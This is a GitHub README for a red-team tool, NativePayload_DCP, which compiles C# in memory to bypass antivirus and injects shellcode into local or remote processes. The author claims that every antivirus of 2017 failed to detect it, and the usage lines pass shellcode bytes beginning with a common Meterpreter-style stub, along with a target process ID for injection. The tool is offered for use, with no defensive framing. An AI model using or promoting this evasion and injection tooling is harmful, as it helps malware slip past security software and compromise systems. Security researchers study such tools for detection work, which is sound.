# NativePayload_DCP

### Compiling Csharp in-memory and Execute to bypass AVs

#### Note: Code created by me in [Jun 2017] and Published in [Mar 2023] ;D but still can help you to bypass some AVs ;)

#### Note: ALL AVs in 2017 Bypassed by this simple code but for now i am not sure for this. 

<p><a href="https://hits.seeyoufarm.com"><img src="https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https://github.com/DamonMohammadbagher/NativePayload_DCP"/></a></p>

usage:
      
    Syntax: injection into local process
    
    NativePayload_DCP.exe DYN-PAY-ARG "fc,48,83,e4,f0,e8,cc,00,00,00,41,51,..."
    
    Syntax: injection into remote process
    
    NativePayload_DCP.exe DYN-TEXT-FILE CHUNK NativePayload_Tinjection.cs TPID "fc,48,83,e4,f0,e8,cc,00,00,00,41,51,..."
    NativePayload_DCP.exe DYN-TEXT-FILE Src NativePayload_Tinjection.cs TPID



   ![](https://github.com/DamonMohammadbagher/NativePayload_DCP/blob/main/NativePayload_DCP.png)
